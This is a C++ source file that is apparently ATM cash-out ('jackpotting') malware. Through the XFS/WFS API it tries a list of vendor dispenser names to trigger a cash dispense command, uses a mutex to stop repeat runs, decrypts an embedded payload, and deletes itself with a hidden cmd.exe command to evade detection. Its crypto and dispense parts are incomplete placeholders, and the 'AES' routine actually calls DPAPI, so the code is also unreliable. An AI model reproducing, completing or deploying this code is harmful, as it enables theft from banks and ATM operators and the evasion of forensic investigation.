#include <windows.h>
#include <stdio.h>
#include <wininet.h>
#include <wfsapi.h>
#include <string>
#include <vector>
#include <wincrypt.h>

#pragma comment(lib, "WFSAPI.lib")
#pragma comment(lib, "crypt32.lib")

// AES key/IV placeholders (must be replaced with real secure values)
BYTE aesKey[32] = { /* YOUR 256-bit key here */ };
BYTE aesIV[16] = { /* YOUR 128-bit IV here */ };

// Fallback logical dispenser names
std::vector<std::string> dispenserNames = {
    "DISP1", "DISPENSER1", "CASHDISP01", "IDISPENSE1",
    "DISP_UNIT1", "CEN_DISP", "NCRDISP01", "NCR_CASHUNIT_1",
    "DN_DISP", "DIEBOLD_DISP1", "DN_CASHDISP01", "CASHDISP", "GEN_DISP", "HYO_DISP1"
};

bool CreateSingleInstance(const char* mutexName) {
    HANDLE hMutex = CreateMutexA(NULL, TRUE, mutexName);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return false;
    }
    return true;
}

bool DecryptAES(BYTE* ciphertext, DWORD cipherLen, BYTE** plaintext, DWORD* plainLen) {
    DATA_BLOB DataIn, DataOut;
    DataIn.pbData = ciphertext;
    DataIn.cbData = cipherLen;

    if (!CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut)) {
        return false;
    }

    *plaintext = (BYTE*)malloc(DataOut.cbData);
    memcpy(*plaintext, DataOut.pbData, DataOut.cbData);
    *plainLen = DataOut.cbData;

    LocalFree(DataOut.pbData);
    return true;
}

bool TryDispenseCash(const std::string& logicalName) {
    HRESULT hResult;
    HSERVICE hService;
    WFSCIMCMD wfsCIMCmd = { 0 };

    hResult = WFSOpen(logicalName.c_str(), WFS_INDEFINITE_WAIT, &hService);
    if (hResult != WFS_SUCCESS) {
        return false;
    }

    // Example dispense command (this would need your real WFS command structure)
    hResult = WFSExecute(hService, WFS_CMD_CDM_DISPENSE, NULL, WFS_INDEFINITE_WAIT, NULL);
    WFSClose(hService);

    return (hResult == WFS_SUCCESS);
}

void SelfDelete() {
    char szModule[MAX_PATH], szCmd[MAX_PATH + 50];
    GetModuleFileNameA(NULL, szModule, MAX_PATH);
    sprintf_s(szCmd, "cmd.exe /C timeout 2 & del \"%s\"", szModule);
    WinExec(szCmd, SW_HIDE);
}

int main() {
    // 1. Prevent multiple execution
    if (!CreateSingleInstance("Global\\MirPP_Mutex")) {
        return 0;
    }

    // 2. AES-decrypt embedded payload (simulation placeholder)
    BYTE dummyCipher[] = { /* your encrypted block here */ };
    BYTE* decrypted = NULL;
    DWORD decryptedLen = 0;
    if (!DecryptAES(dummyCipher, sizeof(dummyCipher), &decrypted, &decryptedLen)) {
        // Failed decryption
        return 0;
    }

    // 3. Attempt dispenser cycle
    bool success = false;
    for (const auto& name : dispenserNames) {
        if (TryDispenseCash(name)) {
            success = true;
            break;
        }
    }

    // 4. Clean up (optionally wipe memory here)
    if (decrypted) {
        SecureZeroMemory(decrypted, decryptedLen);
        free(decrypted);
    }

    // 5. Self-delete if wanted
    if (success) {
        SelfDelete();
    }

    return 0;
}
